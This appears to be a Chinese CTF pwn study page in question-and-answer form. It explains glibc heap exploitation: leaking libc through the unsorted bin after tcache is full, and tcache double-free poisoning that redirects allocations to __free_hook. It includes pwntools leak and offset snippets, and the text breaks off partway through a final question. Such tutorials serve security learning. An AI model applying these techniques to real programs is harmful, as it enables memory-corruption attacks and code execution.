+<h3 id="2-利用unsorted-bin-attack泄露main-arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted-bin，剩下一个阻隔top-chunk防止合并"><a href="#2-利用unsorted-bin-attack泄露main-arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted-bin，剩下一个阻隔top-chunk防止合并" class="headerlink" title="2.利用unsorted bin attack泄露main_arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted bin，剩下一个阻隔top chunk防止合并"></a>2.利用unsorted bin attack泄露main_arean地址进而泄露libc基址。申请9个chunk，释放7个填满tcache，在释放一个进入unsorted bin，剩下一个阻隔top chunk防止合并</h3><h4 id="1-初始准备：申请-9-个-Chunk"><a href="#1-初始准备：申请-9-个-Chunk" class="headerlink" title="1. 初始准备：申请 9 个 Chunk"></a>1. 初始准备：申请 9 个 Chunk</h4><p>假设我们申请 9 个大小为 <code>0x90</code>（用户数据大小）的 Chunk，加上头部 <code>0x10</code>，实际 Chunk 大小为 <code>0xa0</code>。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 伪代码</span><br><span class="line">for (int i = 0; i &lt; 9; i++) &#123;</span><br><span class="line">    ptr[i] = malloc(0x90);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>此时的堆布局：</p>
+<p>[ Chunk 0 ] [ Chunk 1 ] … [ Chunk 6 ] [ Chunk 7 ] [ Chunk 8 ] [ Top Chunk ]</p>
+<ul>
+<li><strong>Chunk 0 - 6</strong> : 用来填满 Tcache。</li>
+<li><strong>Chunk 7</strong> :  <strong>Victim Chunk</strong> （受害者），我们将通过它泄露地址。</li>
+<li><strong>Chunk 8</strong> :  <strong>Guard Chunk</strong> （隔离块），防止 Chunk 7 与 Top Chunk 合并。</li>
+</ul>
+<hr>
+<h4 id="2-第一阶段：填满-Tcache-Free-0-6"><a href="#2-第一阶段：填满-Tcache-Free-0-6" class="headerlink" title="2. 第一阶段：填满 Tcache (Free 0-6)"></a>2. 第一阶段：填满 Tcache (Free 0-6)</h4><p>Glibc 的逻辑是：只要 Tcache 没满（对应大小的链表 count &lt; 7），就优先放进 Tcache。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">    free(ptr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>发生了什么：</strong></p>
+<ul>
+<li>Chunk 0 到 Chunk 6 被放入了 <code>Tcache Bin (0xa0)</code> 链表中。</li>
+<li><strong>关键点</strong> ：Tcache 中的 Chunk，其 <code>fd/next</code> 指针指向的是堆上的下一个空闲 Chunk（Heap Address），或者是 NULL。<strong>此时堆里没有任何 Libc 的地址。</strong></li>
+<li><code>Tcache Count</code> 变为 7（已满）。</li>
+</ul>
+<hr>
+<h4 id="3-第二阶段：进入-Unsorted-Bin-Free-7"><a href="#3-第二阶段：进入-Unsorted-Bin-Free-7" class="headerlink" title="3. 第二阶段：进入 Unsorted Bin (Free 7)"></a>3. 第二阶段：进入 Unsorted Bin (Free 7)</h4><p>现在我们释放关键的第 8 个块（<code>ptr[7]</code>）。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(ptr[7]);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>系统逻辑判断流程：</strong></p>
+<ol>
+<li><strong>检查 Tcache</strong> ：发现 <code>0xa0</code> 这个大小的 Tcache 已经满了（7&#x2F;7）。于是放弃放入 Tcache。</li>
+<li><strong>检查合并（Backward）</strong> ：查看前一个物理相邻的块（Chunk 6）。虽然 Chunk 6 已经被 <code>free</code> 进 Tcache 了， <strong>但是 Tcache 机制不会清除物理相邻块的 <code>PREV_INUSE (P)</code> 标志位</strong> 。所以系统认为 Chunk 6 还是“使用中”的，<strong>不会</strong>向低地址合并。</li>
+<li><strong>检查合并（Forward）</strong> ：查看后一个物理相邻的块（Chunk 8）。</li>
+</ol>
+<ul>
+<li>这就体现了 <strong>Chunk 8 (Guard Chunk)</strong> 的作用了。</li>
+<li>因为 <code>ptr[8]</code> 还没有被释放，是 <code>IN USE</code> 状态。</li>
+<li>所以 <code>ptr[7]</code> <strong>不会</strong>向高地址与 Top Chunk 合并。</li>
+</ul>
+<ol>
+<li><strong>放入 Unsorted Bin</strong> ：既不能进 Tcache，又不能合并，Chunk 7 最终被扔进了  <strong>Unsorted Bin</strong> 。</li>
+</ol>
+<hr>
+<h4 id="4-核心原理：Libc-地址是如何泄露的？"><a href="#4-核心原理：Libc-地址是如何泄露的？" class="headerlink" title="4. 核心原理：Libc 地址是如何泄露的？"></a>4. 核心原理：Libc 地址是如何泄露的？</h4><p>这是最关键的一步。当一个 Chunk 成为 Unsorted Bin 中的 <strong>第一个</strong> （也是唯一一个）节点时，它的 <code>fd</code> 和 <code>bk</code> 指针会被系统修改，指向 Unsorted Bin 的链表头。</p>
+<p><strong>Unsorted Bin 是双向链表，链表头位于 Libc 的 <code>main_arena</code> 结构体中。</strong></p>
+<p>此时 <code>ptr[7]</code> 的内存（用户数据区前 16 字节）发生了如下变化：</p>
+<ul>
+<li><code>ptr[7] -&gt; fd</code> &#x3D; <code>&amp;main_arena + 88</code> (即 Unsorted Bin 头部地址)</li>
+<li><code>ptr[7] -&gt; bk</code> &#x3D; <code>&amp;main_arena + 88</code></li>
+</ul>
+<p><strong>内存视角（GDB）：</strong></p>
+<p><strong>Plaintext</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x55...000 [Chunk 7 Header]</span><br><span class="line">0x55...010 [  fd 指针   ]  &lt;-- 0x7f...xxx (这是 libc 中的地址!)</span><br><span class="line">0x55...018 [  bk 指针   ]  &lt;-- 0x7f...xxx (这是 libc 中的地址!)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>这个 <code>0x7f...</code> 开头的地址，就是 <code>main_arena</code> 内部的一个偏移地址。</p>
+<hr>
+<h4 id="5-如何获取并计算基址？"><a href="#5-如何获取并计算基址？" class="headerlink" title="5. 如何获取并计算基址？"></a>5. 如何获取并计算基址？</h4><p>此时，如果你有一个 <strong>UAF (Use-After-Free)</strong> 漏洞，能够打印 <code>ptr[7]</code> 的内容，或者你通过某种方式申请到了这块内存但没有覆盖这两个指针，你就可以读出这个地址。</p>
+<p><strong>计算公式：</strong></p>
+<p>$$<br>\text{Libc Base} &#x3D; \text{Leaked Address} - \text{Offset}_{\text{main_arena}} - 96<br>$$</p>
+<ul>
+<li><strong>Leaked Address</strong> : 你从 <code>fd</code> 读到的值。</li>
+<li><strong>96 (0x60)</strong> : 这是 Unsorted Bin 链表头在 <code>main_arena</code> 结构体中的固定偏移（64位系统通常是 96，有时是 88，取决于具体版本，可以用 <code>pwntools</code> 里的 <code>libc.symbols[&#39;__malloc_hook&#39;] + 0x10</code> 附近来推算）。</li>
+<li><strong>Offset_main_arena</strong> : <code>main_arena</code> 在 Libc 文件中的偏移。</li>
+</ul>
+<h4 id="总结：为什么要这么做？"><a href="#总结：为什么要这么做？" class="headerlink" title="总结：为什么要这么做？"></a>总结：为什么要这么做？</h4><ol>
+<li><strong>Tcache 也就是个缓存</strong> ：它只存堆地址，不存 Libc 地址，对泄露 Libc 基址没用。</li>
+<li><strong>Unsorted Bin 是桥梁</strong> ：它连接了 Heap 和 Libc。</li>
+<li><strong>Chunk 8 是墙</strong> ：如果没有 Chunk 8，Chunk 7 释放时会发现后面是 Top Chunk，直接并入 Top Chunk。Top Chunk 只是一个大小记录，没有 <code>fd/bk</code> 指针指向 <code>main_arena</code>，你就啥也泄露不到了。</li>
+</ol>
+<h3 id="3-检查合并（Backward）：查看前一个物理相邻的块（Chunk-6）。虽然-Chunk-6-已经被-free-进-Tcache-了，但是-Tcache-机制不会清除物理相邻块的-PREV-INUSE-P-标志位。所以系统认为-Chunk-6-还是“使用中”的，不会向低地址合并。我这里不是已经free了6了吗，为什么还是使用中"><a href="#3-检查合并（Backward）：查看前一个物理相邻的块（Chunk-6）。虽然-Chunk-6-已经被-free-进-Tcache-了，但是-Tcache-机制不会清除物理相邻块的-PREV-INUSE-P-标志位。所以系统认为-Chunk-6-还是“使用中”的，不会向低地址合并。我这里不是已经free了6了吗，为什么还是使用中" class="headerlink" title="3.检查合并（Backward）：查看前一个物理相邻的块（Chunk 6）。虽然 Chunk 6 已经被 free 进 Tcache 了，但是 Tcache 机制不会清除物理相邻块的 PREV_INUSE (P) 标志位。所以系统认为 Chunk 6 还是“使用中”的，不会向低地址合并。我这里不是已经free了6了吗，为什么还是使用中"></a>3.检查合并（Backward）：查看前一个物理相邻的块（Chunk 6）。虽然 Chunk 6 已经被 free 进 Tcache 了，但是 Tcache 机制不会清除物理相邻块的 PREV_INUSE (P) 标志位。所以系统认为 Chunk 6 还是“使用中”的，不会向低地址合并。我这里不是已经free了6了吗，为什么还是使用中</h3><p><strong>你代码层面确实 <code>free</code> 了它，但在堆管理器的元数据（Metadata）层面，它“伪装”成了还在使用。</strong></p>
+<p>我们需要深入理解 glibc 是如何标记“空闲”状态的。</p>
+<h4 id="1-传统的-Free-Unsorted-Small-Bin"><a href="#1-传统的-Free-Unsorted-Small-Bin" class="headerlink" title="1. 传统的 Free (Unsorted&#x2F;Small Bin)"></a>1. 传统的 Free (Unsorted&#x2F;Small Bin)</h4><p>在 Tcache 出现之前（或者当 Chunk 放入 Unsorted Bin 时），当你 <code>free(Chunk 6)</code> 时，堆管理器会做两件事：</p>
+<ol>
+<li>把 Chunk 6 放入空闲链表。</li>
+<li><strong>找到物理相邻的下一个块（Chunk 7），把 Chunk 7 的 <code>PREV_INUSE (P)</code> 标志位设为 0。</strong></li>
+</ol>
+<p><strong>这才是物理层面的“我空闲了”的信号。</strong> 只要 Chunk 7 的 P 位是 0，系统就知道它前面的 Chunk 6 是空的，可以合并。</p>
+<hr>
+<h4 id="2-Tcache-的-Free-偷懒模式"><a href="#2-Tcache-的-Free-偷懒模式" class="headerlink" title="2. Tcache 的 Free (偷懒模式)"></a>2. Tcache 的 Free (偷懒模式)</h4><p>Tcache 的设计初衷是 <strong>快</strong> ，尽一切可能减少内存读写和计算。</p>
+<p>当你 <code>free(Chunk 6)</code> 且它进入 Tcache 时：</p>
+<ol>
+<li>系统直接把 Chunk 6 挂入 Tcache 链表（仅操作 Chunk 6 自身的数据区存放 next 指针）。</li>
+<li><strong>系统完全不理会、不修改、也不读取下一个块（Chunk 7）。</strong></li>
+</ol>
+<p><strong>结果就是：</strong><br>尽管 Chunk 6 已经在 Tcache 链表里等着被再利用了，但是<strong>Chunk 7 的 P 标志位（PREV_INUSE）依然是 1。</strong></p>
+<h4 id="3-此时的视角差异"><a href="#3-此时的视角差异" class="headerlink" title="3. 此时的视角差异"></a>3. 此时的视角差异</h4><ul>
+<li><strong>你的视角（代码）：</strong> <code>ptr[6]</code> 已经被 <code>free</code> 了，它是空的。</li>
+<li><strong>Chunk 7 的视角（元数据）：</strong> 我的 P 标志位是 1。这意味着我前面的邻居（Chunk 6）正在被使用，我绝对不能跟它合并，否则会破坏别人的数据。</li>
+</ul>
+<h4 id="4-为什么要这样设计？"><a href="#4-为什么要这样设计？" class="headerlink" title="4. 为什么要这样设计？"></a>4. 为什么要这样设计？</h4><p>为了 <strong>速度</strong> 。</p>
+<p>如果 Tcache 的每次 free 都要去更新下一个块的标志位：</p>
+<ol>
+<li>CPU 需要多访问一次内存（访问 Chunk 7），这可能会导致 Cache Miss（缓存未命中），降低速度。</li>
+<li>如果更新了标志位，下次 malloc 从 Tcache 取出 Chunk 6 时，又得去把 Chunk 7 的 P 位改回 1，这又是多余的操作。</li>
+</ol>
+<p><strong>Tcache 的逻辑是：</strong> “反正这个块马上就会被再次申请出去（热数据），我就不告诉邻居我空闲了，这样省事。”</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>Chunk 6 <strong>在逻辑上</strong>是 Free 的（在 Tcache 链表里）。</li>
+<li>Chunk 6 <strong>在物理上</strong>看起来是 In-Use 的（因为 Chunk 7 的 P 位没变）。</li>
+<li>因此，当你 <code>free(Chunk 7)</code> 时，它检查自己的 P 位，发现是 1，认为 Chunk 6 还在忙，所以 <strong>不会向低地址合并</strong> ，只能把自己作为一个独立的块扔进 Unsorted Bin。</li>
+</ul>
+<h3 id="4-我释放了8个chunk后，我现在再申请8个，详细解释此时为什么能泄露libc"><a href="#4-我释放了8个chunk后，我现在再申请8个，详细解释此时为什么能泄露libc" class="headerlink" title="4.我释放了8个chunk后，我现在再申请8个，详细解释此时为什么能泄露libc"></a>4.我释放了8个chunk后，我现在再申请8个，详细解释此时为什么能泄露libc</h3><h4 id="1-前-7-次申请：清空-Tcache"><a href="#1-前-7-次申请：清空-Tcache" class="headerlink" title="1. 前 7 次申请：清空 Tcache"></a>1. 前 7 次申请：清空 Tcache</h4><p>当你执行前 7 次 <code>malloc(0x90)</code> 时：</p>
+<ul>
+<li><strong>来源</strong> ：系统优先查看 Tcache。</li>
+<li><strong>动作</strong> ：Tcache 遵循 LIFO（后进先出）原则，依次把你之前释放的 Chunk 6, 5, 4, 3, 2, 1, 0 弹出来给你。</li>
+<li><strong>内容</strong> ：这些 Chunk 里的内容是 Tcache 的链表指针（指向堆地址）或者乱码。</li>
+<li><strong>结果</strong> ：Tcache 被取空了。此时你手里拿回了前 7 个块，但这对泄露 Libc 没帮助。</li>
+</ul>
+<h4 id="2-第-8-次申请：命中-Unsorted-Bin-关键时刻"><a href="#2-第-8-次申请：命中-Unsorted-Bin-关键时刻" class="headerlink" title="2. 第 8 次申请：命中 Unsorted Bin (关键时刻)"></a>2. 第 8 次申请：命中 Unsorted Bin (关键时刻)</h4><p>当你执行第 8 次 <code>malloc(0x90)</code> 时：</p>
+<ul>
+<li><strong>检查 Tcache</strong> ：空的。</li>
+<li><strong>检查 Unsorted Bin</strong> ：系统发现里面躺着一个  <strong>Chunk 7</strong> 。</li>
+<li><strong>大小匹配</strong> ：Chunk 7 的大小正好是你需要的。</li>
+<li><strong>脱链 (Unlink)</strong> ：系统把 Chunk 7 从 Unsorted Bin 链表中取下来，标记为 <code>In Use</code>。</li>
+<li><strong>返回指针</strong> ：系统把 Chunk 7 的用户数据指针返回给你。</li>
+</ul>
+<h4 id="3-为什么地址还在？-内存残留"><a href="#3-为什么地址还在？-内存残留" class="headerlink" title="3. 为什么地址还在？(内存残留)"></a>3. 为什么地址还在？(内存残留)</h4><p>这才是泄露的核心原因。</p>
+<p>当 Chunk 7 在 Unsorted Bin 里的时候，为了维护双向链表，它的**前 16 个字节（用户数据区）**被系统征用了，存放了两个指针：</p>
+<ol>
+<li><code>fd</code> (Forward Pointer): 指向 <code>main_arena + 88/96</code></li>
+<li><code>bk</code> (Backward Pointer): 指向 <code>main_arena + 88/96</code></li>
+</ol>
+<p><strong>当你申请回 Chunk 7 时，<code>malloc</code> 并没有把这 16 个字节清零。</strong></p>
+<p>系统默认你会用新数据覆盖它，但如果你 <strong>不覆盖</strong> ，直接去读取（比如 <code>puts</code> 或 <code>show</code>），你读到的就是这两个残留的指针！</p>
+<h4 id="4-内存视角图解"><a href="#4-内存视角图解" class="headerlink" title="4. 内存视角图解"></a>4. 内存视角图解</h4><p><strong>状态 A：Chunk 7 在 Unsorted Bin 中（Free 状态）</strong></p>
+<p><strong>Plaintext</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chunk 7 User Ptr -&gt; [  main_arena + 96  ] (fd)</span><br><span class="line">                    [  main_arena + 96  ] (bk)</span><br><span class="line">                    [      ...          ]</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>状态 B：你 malloc 了第 8 次（In Use 状态）</strong></p>
+<p><strong>Plaintext</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptr[7] ----------&gt;  [  main_arena + 96  ] &lt;--- 数据完全没变！</span><br><span class="line">                    [  main_arena + 96  ]</span><br><span class="line">                    [      ...          ]</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>状态 C：你执行 <code>puts(ptr[7])</code></strong><br><code>puts</code> 会打印该地址处的字符串，直到遇到 <code>\x00</code>。由于 64 位地址通常是 6 字节长（高位是 0），<code>puts</code> 会把这 6 个字节打印出来，这就是 Libc 的地址。</p>
+<h4 id="5-操作总结与注意事项"><a href="#5-操作总结与注意事项" class="headerlink" title="5. 操作总结与注意事项"></a>5. 操作总结与注意事项</h4><ol>
+<li><strong>申请回来</strong> ：<code>p7 = malloc(0x90)</code></li>
+<li><strong>千万别写</strong> ：此时<strong>绝对不要</strong>立刻往 <code>p7</code> 里写数据（比如 <code>sendline(&quot;AAAA&quot;)</code>），否则你会把残留的 Libc 地址覆盖掉！</li>
+<li><strong>立刻读</strong> ：应该立刻调用程序里的打印函数（如果有的话）去读 <code>p7</code> 的内容。</li>
+<li><strong>计算</strong> ：<br><code>leak_addr = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</code><br><code>libc_base = leak_addr - 96 - libc.symbols[&#39;__malloc_hook&#39;] - 0x10</code> (根据具体 libc 版本调整偏移)</li>
+</ol>
+<h4 id="为什么这个技巧如此重要？"><a href="#为什么这个技巧如此重要？" class="headerlink" title="为什么这个技巧如此重要？"></a>为什么这个技巧如此重要？</h4><p>这是因为 Glibc 认为“清除内存是用户的责任，不是系统的责任”（除非你用 <code>calloc</code>，它会自动清零）。利用这个“残留数据”特性，是 Pwn 中泄露信息的基石</p>
+<h3 id="5-destroy-0）destroy-0-blow-up-build-p64-free-hook-addr-为什么我-删了blow-up后，会卡住"><a href="#5-destroy-0）destroy-0-blow-up-build-p64-free-hook-addr-为什么我-删了blow-up后，会卡住" class="headerlink" title="5. destroy(0）destroy(0)blow_up() build(p64(__free_hook_addr)) 为什么我 删了blow_up后，会卡住"></a>5. destroy(0）destroy(0)blow_up() build(p64(__free_hook_addr)) 为什么我 删了blow_up后，会卡住</h3><p>这个问题出现在 Pwn 脚本调试中非常典型。</p>
+<p><strong>根本原因：</strong> 删除了 <code>blow_up()</code> 后，导致脚本卡住（Hang），大概率是因为  <strong>Pwntools 的交互流与服务端的程序逻辑不同步了</strong> 。</p>
+<p>最常见的情况是：你的 <code>build</code> 函数试图发送数据，但服务端 <strong>拒绝了这次内存申请</strong> ，导致服务端没有发送 <code>build</code> 函数所期待的提示符（例如 “Input content:”），脚本一直在死等。</p>
+<p>以下是详细的技术分析：</p>
+<h5 id="1-核心冲突：UAF-Double-Free-与-Malloc-的矛盾"><a href="#1-核心冲突：UAF-Double-Free-与-Malloc-的矛盾" class="headerlink" title="1. 核心冲突：UAF (Double Free) 与 Malloc 的矛盾"></a>1. 核心冲突：UAF (Double Free) 与 Malloc 的矛盾</h5><p>你要进行 Tcache Double Free 攻击，必须利用  <strong>UAF (Use After Free)</strong> 。</p>
+<ul>
+<li><strong>Double Free 的前提</strong> ：<code>destroy(0)</code> 后，程序<strong>没有</strong>将 <code>ptr[0]</code> 指针清空（置为 NULL）。这就产生了一个“悬垂指针”。</li>
+<li><strong>Malloc (build) 的前提</strong> ：大多数堆题的 <code>add/create/build</code> 功能在申请内存前，会检查数组槽位是否为空（例如 <code>if (ptr[i] == NULL)</code>）。</li>
+</ul>
+<p><strong>发生了什么：</strong></p>
+<ol>
+<li>你执行了两次 <code>destroy(0)</code>。</li>
+<li>此时，在服务端的记录中， <strong><code>ptr[0]</code> 依然是有值的（指向被释放的堆块）</strong> 。</li>
+<li>当你接着调用 <code>build</code> 时，服务端逻辑会遍历数组寻找空位。</li>
+<li>因为它看到 <code>ptr[0]</code> (以及之前释放的 1 和 2) 都是“非空”的，它可能会认为**“没有空闲的槽位”**，从而打印 “Full” 或 “Index occupied” 并返回菜单。</li>
+<li>但是，你的 Python <code>build</code> 函数里写的是 <code>recvuntil(&quot;Content:&quot;)</code>（等待输入内容）。</li>
+<li><strong>结果</strong> ：服务端在等菜单指令，脚本在等 “Content:”，双方互相等待，这就 <strong>卡住了</strong> 。</li>
+</ol>
+<h3 id="6-详细解释为什么我重新申请的时候参数写成free-hook的地址就会使得fd指向这个地址了"><a href="#6-详细解释为什么我重新申请的时候参数写成free-hook的地址就会使得fd指向这个地址了" class="headerlink" title="6.详细解释为什么我重新申请的时候参数写成free_hook的地址就会使得fd指向这个地址了"></a>6.详细解释为什么我重新申请的时候参数写成free_hook的地址就会使得fd指向这个地址了</h3><p>你的困惑在于：<strong>为什么我明明是在往“申请到的内存”里写数据，却改变了 Tcache 链表的指向？</strong></p>
+<p>答案的核心在于：<strong>在 Tcache 中，空闲块的 <code>next</code> 指针（即链表指针）和用户将来能用的 <code>data</code> 区域，使用的是同一块内存空间（重叠）。</strong></p>
+<p>让我们分三步详细拆解这个“偷天换日”的过程。</p>
+<hr>
+<h5 id="第一阶段：Double-Free-后的初始状态"><a href="#第一阶段：Double-Free-后的初始状态" class="headerlink" title="第一阶段：Double Free 后的初始状态"></a>第一阶段：Double Free 后的初始状态</h5><p>假设我们连续释放了两次 Chunk 0 (Double Free)，此时 Tcache 链表形成了一个闭环。</p>
+<ul>
+<li><strong>Tcache Head</strong> 指向 Chunk 0。</li>
+<li><strong>Chunk 0 的 fd&#x2F;next 指针</strong> 指向 Chunk 0 自身。</li>
+</ul>
+<p><strong>内存视图：</strong></p>
+<p><strong>Plaintext</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Tcache Head -&gt; [ Chunk 0 ]</span><br><span class="line"></span><br><span class="line">[ Chunk 0 内存空间 ]</span><br><span class="line">+----------------------+</span><br><span class="line">| next 指针 (8 bytes)  |  -----&gt; 指向 Chunk 0 (自己)</span><br><span class="line">+----------------------+</span><br><span class="line">|      剩余空间        |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h5 id="第二阶段：你申请了内存-malloc"><a href="#第二阶段：你申请了内存-malloc" class="headerlink" title="第二阶段：你申请了内存 (malloc)"></a>第二阶段：你申请了内存 (<code>malloc</code>)</h5><p>当你执行 <code>build(...)</code> 时，首先发生的是 <code>malloc</code>。</p>
+<p><code>malloc</code> 调用 <code>tcache_get()</code> 从链表中取出一个块。它的逻辑如下：</p>
+<ol>
+<li><strong>取块</strong> ：拿到 Head 指向的块（Chunk 0）。这是返回给用户的地址。</li>
+<li><strong>更新 Head</strong> ：将 Head 指向 <code>Chunk 0 -&gt; next</code>。</li>
+</ol>
+<p><strong>关键点来了：</strong><br>因为此时 <code>Chunk 0 -&gt; next</code> 指向的是它自己（Chunk 0），所以 Head 更新后， <strong>依然指向 Chunk 0</strong> 。</p>
+<p><strong>此时的状态：</strong></p>
+<ul>
+<li><strong>用户手里</strong> ：拿到了 Chunk 0 的指针（准备往里写数据）。</li>
+<li><strong>Tcache Head</strong> ：依然指向 Chunk 0（系统以为 Chunk 0 还是个空闲块）。</li>
+</ul>
+<hr>
+<h5 id="第三阶段：你写入了数据-read-strcpy"><a href="#第三阶段：你写入了数据-read-strcpy" class="headerlink" title="第三阶段：你写入了数据 (read&#x2F;strcpy)"></a>第三阶段：你写入了数据 (<code>read</code>&#x2F;<code>strcpy</code>)</h5><p>这就是你问题中“参数写成 free_hook”的一步。<br>你的代码逻辑通常是：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr = malloc(size);      // 拿到 Chunk 0</span><br><span class="line">read(0, ptr, size);      // 往 Chunk 0 里写数据</span><br></pre></td></tr></table></figure></div>
+
+<p>你发送了 <code>p64(__free_hook_addr)</code>。这 8 个字节会被写入 <code>ptr</code> 指向的位置。</p>
+<p><strong>但是！<code>ptr</code> 指向的位置（用户数据区起始），恰好就是 Tcache 用来存放 <code>next</code> 指针的位置！</strong></p>
+<p><strong>动作发生瞬间：</strong><br>你把 Chunk 0 开头的 8 字节（原本是指向自身的 <code>next</code> 指针）覆盖成了 <code>__free_hook</code> 的地址。</p>
+<p><strong>内存视图（写入后）：</strong></p>
+<p><strong>Plaintext</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[ Chunk 0 内存空间 ]</span><br><span class="line">+----------------------------+</span><br><span class="line">| 用户数据 / next 指针 (重叠) |</span><br><span class="line">| 值: 0x... (__free_hook)    |  &lt;-- 你刚写进去的数据</span><br><span class="line">+----------------------------+</span><br><span class="line">|          ...               |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h5 id="第四阶段：结果（链表被篡改）"><a href="#第四阶段：结果（链表被篡改）" class="headerlink" title="第四阶段：结果（链表被篡改）"></a>第四阶段：结果（链表被篡改）</h5><p>现在我们回过头看 Tcache 链表变成了什么样。</p>
+<ol>
+<li><strong>Tcache Head</strong> ：依然指向 Chunk 0（因为第二阶段里它还没变）。</li>
+<li><strong>Chunk 0 -&gt; next</strong> ：系统再次查看 Chunk 0 的 next 指针时，读取到的就是你刚刚写进去的 <code>__free_hook</code> 地址。</li>
+</ol>
+<p><strong>于是，链表变成了：</strong><br><code>Head -&gt; Chunk 0 -&gt; __free_hook</code></p>
+<p><strong>这就意味着：</strong></p>
+<ul>
+<li>下一次申请：你会再次申请到 Chunk 0。</li>
+<li><strong>下下一次申请</strong> ：Tcache 会顺着链表找到 <code>__free_hook</code>，把它分配给你！</li>
+</ul>
+<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>你之所以能修改 <code>fd</code> 指向，是因为：</p>
+<ol>
+<li><strong>复用</strong> ：Tcache 为了省空间，把链表指针存在了用户数据区的前 8 字节。</li>
+<li><strong>时间差</strong> ：由于 Double Free，Chunk 0 既是“已分配”（在你手里），又是“空闲”（在链表里）。</li>
+<li><strong>覆盖</strong> ：当你以“填充内容”的名义写入数据时，实际上是在“修改链表结构”。</li>
+</ol>
+<h3 id="7-那如果是Head-Chunk-0-chunk-1，我在malloc后，read写入chunk0是不是也改变了它的next指针，也就是没有形成环的情况"><a href="#7-那如果是Head-Chunk-0-chunk-1，我在malloc后，read写入chunk0是不是也改变了它的next指针，也就是没有形成环的情况" class="headerlink" title="7.那如果是Head -&gt; Chunk 0 -&gt; chunk 1，我在malloc后，read写入chunk0是不是也改变了它的next指针，也就是没有形成环的情况"></a>7.那如果是Head -&gt; Chunk 0 -&gt; chunk 1，我在malloc后，read写入chunk0是不是也改变了它的next指针，也就是没有形成环的情况</h3><p>之所以在 Double Free (环) 的情况下能投毒，而在正常情况下不能，区别在于 <strong><code>malloc</code> 发生时，Head 指针是否已经转移走了。</strong></p>
+<p>让我们像慢动作回放一样，对比这两种情况。</p>
+<hr>
+<h5 id="情况一：正常情况-Head-Chunk-0-Chunk-1"><a href="#情况一：正常情况-Head-Chunk-0-Chunk-1" class="headerlink" title="情况一：正常情况 (Head -&gt; Chunk 0 -&gt; Chunk 1)"></a>情况一：正常情况 (Head -&gt; Chunk 0 -&gt; Chunk 1)</h5><p>假设你现在的目标是申请 Chunk 0 并写入数据。</p>
+<p><strong>1. 初始状态</strong></p>
+<ul>
+<li><strong>Tcache Head</strong> : 指向 Chunk 0</li>
+<li><strong>Chunk 0 内容</strong> : 存储着 Chunk 1 的地址 (next 指针)</li>
+<li><strong>链表</strong> : <code>Head -&gt; Chunk 0 -&gt; Chunk 1</code></li>
+</ul>
+<p><strong>2. 执行 <code>ptr = malloc(...)</code></strong><br>系统执行 <code>tcache_get()</code>，发生了以下关键步骤：</p>
+<ol>
+<li><strong>读</strong> : 系统查看 Head，找到了 Chunk 0。</li>
+<li><strong>存</strong> : 系统读取 Chunk 0 里的 <code>next</code> 指针（即 Chunk 1 的地址），暂时记在寄存器里。</li>
+<li><strong>移</strong> : 系统把  <strong>Tcache Head 更新为 Chunk 1</strong> 。</li>
+<li><strong>给</strong> : 系统把 Chunk 0 给用户（也就是你）。</li>
+</ol>
+<p><strong>此时的状态（malloc 刚结束，还没 write）：</strong></p>
+<ul>
+<li><strong>用户</strong> : 拥有 Chunk 0。</li>
+<li><strong>Tcache Head</strong> :  <strong>已经指向 Chunk 1 了</strong> 。</li>
+<li>Chunk 0 已经彻底脱离了链表关系。</li>
+</ul>
